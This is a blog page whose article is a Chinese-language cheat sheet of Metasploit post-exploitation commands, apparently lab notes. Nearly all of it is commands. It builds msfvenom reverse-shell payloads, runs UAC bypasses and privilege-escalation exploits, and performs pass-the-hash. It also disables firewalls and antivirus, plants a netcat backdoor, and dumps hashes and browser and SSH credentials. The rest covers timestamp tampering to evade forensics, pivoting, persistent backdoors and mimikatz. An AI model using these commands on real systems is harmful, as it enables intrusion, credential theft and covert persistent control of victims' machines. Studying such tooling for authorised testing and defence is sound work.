<!DOCTYPE html>
<html>
  
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  <meta name="author" content="Dong Yuanxin">
  
  
  <title>Mestasploit 后渗透 | hcncn6</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="Hexo, Theme-AD">
  

  
  <meta name="description" content="hcncn小站">

  

  

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
  

  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
    welcome: {"enable":false,"interval":30},
    start_time: "2018-11-1",
    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
    is_post: true,
    lock: false,
    author: "Dong Yuanxin",
    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  <script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>

  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  <link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">

  
</head>
  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">博客</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | 持续更新中</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首页</a>
      
        <a href="/archives/" target="_self">归档</a>
      
        <a href="/categories/" target="_self">分类</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/dongyuanxin/" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首页
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            归档
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/categories/" target="_self">
            分类
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2019-01-01
    </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    Mestasploit 后渗透
  </h1>
  
  <article class="passage-article">
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br></pre></td><td class="code"><pre><span class="line"> Mestasploit 后渗透</span><br><span class="line">system 账号权限</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp </span><br><span class="line">LHOST=192.168.47.134 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o </span><br><span class="line">10.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  -a x64 --platform windows LHOST=192.168.47.134 LPORT=4444 -b &quot;\x00&quot; -e x64/shikata_ga_nai -f exe -o 2.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取 system 账号权限</span><br><span class="line"></span><br><span class="line">    提权失败，一般是由于 UAC 限制</span><br><span class="line"></span><br><span class="line">    meterpreter &gt; getuid</span><br><span class="line">    Server username: WIN7-VM\John</span><br><span class="line">    meterpreter &gt; load priv</span><br><span class="line">    [-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">    meterpreter &gt; getsystem </span><br><span class="line">    [-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:</span><br><span class="line">    [-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">    [-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">    [-] Token Duplication (In Memory/Admin)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    meterpreter &gt; background</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">绕过 UAC 限制</span><br><span class="line">1.</span><br><span class="line">    use exploit/windows/local/ask</span><br><span class="line">    set payload windows/meterpreter/reverse_tcp</span><br><span class="line">    set LHOST 10.0.0.128</span><br><span class="line">    set FILENAME win_update.exe</span><br><span class="line">    set SESSION 1</span><br><span class="line">    exploit</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set SESSION 1 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.0.0.128</span><br><span class="line">show targets</span><br><span class="line">exploit</span><br><span class="line">3.</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">4.</span><br><span class="line"></span><br><span class="line">利用漏洞直接提权为 system</span><br><span class="line">use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">5.</span><br><span class="line">use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">6.</span><br><span class="line">use exploit/windows/local/ms13_097_ie_registry_symlink </span><br><span class="line">set SESSION 1 set URIPATH / </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 10.0.0.128 set SRVHOST 10.0.0.128 exploit</span><br><span class="line">7.</span><br><span class="line">use exploit/windows/local/ppr_flatten_rec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">图形化 payload</span><br><span class="line"></span><br><span class="line">    set payload windows/vncinject/reverse_tcp</span><br><span class="line"></span><br><span class="line">    use exploit/windows/local/ppr_flatten_rec</span><br><span class="line">    set payload windows/vncinject/reverse_tcp</span><br><span class="line">    set SESSION 1</span><br><span class="line">    set LHOST 10.0.0.128</span><br><span class="line">    set ViewOnly false</span><br><span class="line">    exploit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> hashdump</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec </span><br><span class="line">set RHOST 10.0.0.132 </span><br><span class="line">set SMBUser John </span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"> set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 10.0.0.128 exploit </span><br><span class="line"></span><br><span class="line">shutdown -r -t 0</span><br><span class="line"></span><br><span class="line">报错：Exploit failed [no-access]</span><br><span class="line">sessions -i 2 </span><br><span class="line">shell </span><br><span class="line"></span><br><span class="line">需要提前关闭 UAC</span><br><span class="line">cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f </span><br><span class="line">cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f </span><br><span class="line"></span><br><span class="line">shutdown /r /t 0</span><br><span class="line"></span><br><span class="line">基础操作</span><br><span class="line"></span><br><span class="line">1. 关闭防火墙</span><br><span class="line"></span><br><span class="line">    需要管理员或system权限</span><br><span class="line"></span><br><span class="line">    netsh advfirewall set allprofiles state on</span><br><span class="line">    netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">2.关闭防火墙</span><br><span class="line"></span><br><span class="line">net stop windefend</span><br><span class="line"></span><br><span class="line">3. bitlocker 加密</span><br><span class="line"></span><br><span class="line">    manage-bde -off C:</span><br><span class="line">    manage-bde -status C:</span><br><span class="line"></span><br><span class="line">4. 关闭 DEP</span><br><span class="line"></span><br><span class="line">    bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br><span class="line"></span><br><span class="line">5 杀死防病毒软件</span><br><span class="line"></span><br><span class="line">    run killav</span><br><span class="line">    run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line">6. 开启远程桌面服务</span><br><span class="line"></span><br><span class="line"># 开启服务</span><br><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">rdesk top 192.168.47.131</span><br><span class="line"></span><br><span class="line"># 关闭服务</span><br><span class="line">run multi_console_command -rc root/.msf4/loot/20180418001805_default_10.0.0.132_host.windows.cle_842354.txt</span><br><span class="line"></span><br><span class="line"># 开启服务</span><br><span class="line">run getgui –e</span><br><span class="line">run getgui -u yuanfh -p pass</span><br><span class="line">run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7. 查看远程桌面</span><br><span class="line">rdesktop 192.168.47.131</span><br><span class="line"></span><br><span class="line">    screenshot  截图</span><br><span class="line">    use espia</span><br><span class="line">        screengrab</span><br><span class="line"></span><br><span class="line">使用 tokens 攻击域控制器</span><br><span class="line"></span><br><span class="line">-tokens</span><br><span class="line">- 用户每次登录，账号绑定临时的tokens</span><br><span class="line">- 访问资源时提交 tokens 进行身份验证，类似于 web cookies</span><br><span class="line">- delegate tokens：交互登录会话</span><br><span class="line">- impersonate tokens：非交互登录会话</span><br><span class="line">- delegate tokens 账号注销后变为 Impersonate Token，权限依然有效</span><br><span class="line"></span><br><span class="line">    Incognito</span><br><span class="line">        独立功能的软件，被 msf 集成在 metepreter 中</span><br><span class="line">        无需密码或破解或获取密码 hash，窃取 tokens 将自己伪装成其他用户</span><br><span class="line">        尤其适用于域环境下提权渗透多操作系统</span><br><span class="line"></span><br><span class="line">    搭建域环境</span><br><span class="line">        DC + XP</span><br><span class="line"></span><br><span class="line">    load incognito</span><br><span class="line">        list_tokens -u</span><br><span class="line">        impersonate_token lab\\administrator</span><br><span class="line">        运行以上命令需要 getsystem</span><br><span class="line">            本地普通权限用户需要先本地权限</span><br><span class="line">            use exploit/windows/local/ms10_015_kitrap0d</span><br><span class="line">            execute -f cmd.exe -i -t # -t：使用当前假冒tokens执行程序</span><br><span class="line">            shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用注册表添加 nc 后门服务（metepreter）</span><br><span class="line">upload /root/gongju/nc.exe  C:\\windows</span><br><span class="line">regedit</span><br><span class="line"></span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line"></span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &apos;C:\windows\nc.exe -Ldp 444 -e cmd.exe&apos;</span><br><span class="line"></span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br><span class="line"></span><br><span class="line">HKLM\software\microsoft\windows\currentversion\Run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开防火墙端口（metepreter）</span><br><span class="line"></span><br><span class="line">    meterpreter &gt;</span><br><span class="line">    execute -f cmd -i -H</span><br><span class="line">    netsh firewall show opmode 看状态</span><br><span class="line">    netsh firewall add portopening TCP 444 &quot;Firefox&quot; ENABLE ALL</span><br><span class="line">    shutdown -r -f -t 0</span><br><span class="line">    netstat -aon|findstr &quot;49157&quot;</span><br><span class="line">    netstat -ano</span><br><span class="line">    nc 10.0.0.132 444</span><br><span class="line"></span><br><span class="line">    需要寻找后面程序</span><br><span class="line"></span><br><span class="line">其他注册表项</span><br><span class="line"></span><br><span class="line">    https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</span><br><span class="line"></span><br><span class="line">抓包</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">抓包（metepreter）</span><br><span class="line"></span><br><span class="line">    load sniffer</span><br><span class="line">    sniffer_interfaces</span><br><span class="line">    sniffer_start 2</span><br><span class="line">    sniffer_dump 2 1.cap / sniffer_dump 2 1.cap</span><br><span class="line">    在内存中缓冲区块循环存储抓包（50000包），不写硬盘</span><br><span class="line">    智能过滤 metepreter 流量，传输全称使用 SSL/TLS 加密</span><br><span class="line"></span><br><span class="line">解码</span><br><span class="line"></span><br><span class="line">    use auxiliary/sniffer/psnuffle</span><br><span class="line">    set PCAPFILE /root/1.cap</span><br><span class="line"></span><br><span class="line">搜索文件</span><br><span class="line"></span><br><span class="line">    search -f *.ini</span><br><span class="line">    search -d c:\\documents\\and\\settings\\administrator\\desktop\\ -f *.docx</span><br><span class="line">    search -d C:\\Users\\Administrator\\Desktop -f *.RTF</span><br><span class="line"></span><br><span class="line">解弱口令</span><br><span class="line">    John the Ripper 破解弱口令</span><br><span class="line"></span><br><span class="line">– use post/windows/gather/hashdump # system 权限的 metepreter</span><br><span class="line">- run # 结果保存在 /tmp 目录下</span><br><span class="line">- use auxiliary/analyze/jtr_crack_fast</span><br><span class="line">- run</span><br><span class="line"></span><br><span class="line">擦除痕迹	</span><br><span class="line"></span><br><span class="line">文件系统访问会留下痕迹。电子取证重点关注</span><br><span class="line">渗透测试和攻击者往往希望销毁文件系统访问痕迹</span><br><span class="line"></span><br><span class="line">最好的避免被电子取证发现的方法：不要碰文件系统</span><br><span class="line">    metepreter 的先天优势所在（完全基于内存）</span><br><span class="line"></span><br><span class="line">MAC 时间 （Modified / Accessed / Changed）</span><br><span class="line">    ls -l --time=atime/mtime/ctime 1.txt</span><br><span class="line">    stat 1.txt</span><br><span class="line">    touch -d &quot;2 days ago&quot; 51.txt</span><br><span class="line">    touch -t 1501010101 1.txt</span><br><span class="line"></span><br><span class="line">MACE：MFT entry</span><br><span class="line">    MFT：NTFS 文件系统的主文件分配表 Master File Table</span><br><span class="line">    通常 1024 字节或2个硬盘扇区，其中存放多项 entry 信息</span><br><span class="line">    包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）</span><br><span class="line">    更多信息可研究文件系统取证分析技术</span><br><span class="line"></span><br><span class="line">Timestomp (meterpreter)</span><br><span class="line">    timestomp -v 1.txt</span><br><span class="line">    timestomp -f c:\\1.exe 1.txt</span><br><span class="line">    -b -r # 擦除 MACE 时间信息，目前此参数功能失效</span><br><span class="line">    -m / -a / -c / -e / -z</span><br><span class="line">    timestomp -a &quot;11/11/2018 18:01:02&quot; 1.txt</span><br><span class="line"></span><br><span class="line">pivoting 跳板 / 枢纽/支点</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    msfvenom 制作 payload</span><br><span class="line">    msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=kali_firewall LPORT=4444 -b &quot;\x00\xff&quot; -e x86/shikata_ga_nai -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.47.140 LPORT=4444 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">    获取 system 权限</span><br><span class="line"></span><br><span class="line">    利用已经控制的一台计算机作为入侵内网的跳板</span><br><span class="line">    在其他内网计算机看来访问全部来自于跳板</span><br><span class="line"></span><br><span class="line">    run autoroute -s 192.168.47.0/24 # 不能访问外网的被攻击目标内网网段</span><br><span class="line">    run autoroute -p</span><br><span class="line">    run autoroute -h</span><br><span class="line">     run autoroute -d -s 192.168.47.0/24</span><br><span class="line">    自动路由现实场景</span><br><span class="line">        利用 win7 攻击内网 XP（对比 xp 有无外网访问权的情况）</span><br><span class="line">        – 扫描内网：use auxiliary/scanner/portscan/tcp</span><br><span class="line"></span><br><span class="line">    Pivoting 之端口转发 portfwd</span><br><span class="line">        利用已经被控计算机，在kali 与攻击目标之间实现端口转发</span><br><span class="line">        portfwd add -L LIP -l LPORT -r RIP -p RPORT</span><br><span class="line">        portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</span><br><span class="line">        portfwd list / delete / flush</span><br><span class="line"></span><br><span class="line">rdesktop 1.1.1.10</span><br><span class="line">rdesktop 127.0.0.1:8898</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">        set RHOST 127.0.0.1</span><br><span class="line">        set LHOST 2.1.1.10</span><br><span class="line">    use exploit/multi/handler</span><br><span class="line">        set exitonsession false</span><br><span class="line"></span><br><span class="line">POST 模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set exitonsession false </span><br><span class="line">    meterpreter &gt;</span><br><span class="line">    run post/windows/gather/arp_scanner RHOSTS=10.0.0.0/24</span><br><span class="line">    run post/windows/gather/checkvm</span><br><span class="line">    run post/windows/gather/credentials/credential_collector 账号</span><br><span class="line">    run post/windows/gather/enum_applications  应用程序</span><br><span class="line">    run post/windows/gather/enum_logged_on_users  有几个账号登录</span><br><span class="line">    run post/windows/gather/enum_snmp  </span><br><span class="line">    run post/windows/manage/delete_user USERNAME=yuanfh  删除</span><br><span class="line">    run post/multi/recon/local_exploit_suggester  可以提权模块</span><br><span class="line">    run post/multi/gather/env   信息 </span><br><span class="line">    run post/multi/gather/firefox_creds  账号密码信息</span><br><span class="line">    run post/multi/gather/ssh_creds</span><br><span class="line">    run post/multi/gather/check_malware REMOTEFILE=c:\a.exe  检查是否为恶意</span><br><span class="line">    run hostsedit -e 1.1.1.1,www.baidu.com</span><br><span class="line">    migrate -N explorer.exe</span><br><span class="line">    </span><br><span class="line">    run [tab] [tab]</span><br><span class="line">    run winenum   大量信息收集</span><br><span class="line"></span><br><span class="line">    自动执行 metepreter 脚本</span><br><span class="line">        set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com</span><br><span class="line">        set InitialAutoRunScript checkvm</span><br><span class="line"></span><br><span class="line">    自动执行 post 模块</span><br><span class="line">        set InitialAutoRunScript migrate -n explorer.exe</span><br><span class="line">        set AutoRunScript post/windows/gather/dumplinks  近期文件</span><br><span class="line"></span><br><span class="line">持久后门</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    利用漏洞取得的 metepreter 运行内存中，重启失效</span><br><span class="line">    重复 exploit 漏洞可能造成服务崩溃</span><br><span class="line"></span><br><span class="line">    持久后门保证漏洞修复后仍可远程控制</span><br><span class="line"></span><br><span class="line">    metepreter 后门</span><br><span class="line">        run metsvc -A # 删除 -r</span><br><span class="line">        use exploit/multi/handler</span><br><span class="line">        set PAYLOAD windows/metsvc_bind_tcp</span><br><span class="line">        set LPORT 31337</span><br><span class="line">        set RHOST 1.1.1.1</span><br><span class="line"></span><br><span class="line">持久后门</span><br><span class="line">        run persistence -h</span><br><span class="line">        run persistence -X -i 10 -p 6667 -r 1.1.1.1</span><br><span class="line">        run persistence -U -i 20 -p 4444 -r 10.0.0.128</span><br><span class="line">        run persistence -S -i 20 -p 4444 -r 10.0.0.128</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LPORT 4445</span><br><span class="line">set  LHOST     192.168.47.141</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf 延伸用法之 mimikatz</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    hashdump 使用的就是 mimikatz 的部分功能</span><br><span class="line">        getsystem</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1028 </span><br><span class="line">进程</span><br><span class="line">ps</span><br><span class="line">migrate  424&gt; 迁移</span><br><span class="line">        load mimikatz</span><br><span class="line">        wdigest kerberos msv ssp tspkg livessp</span><br><span class="line">        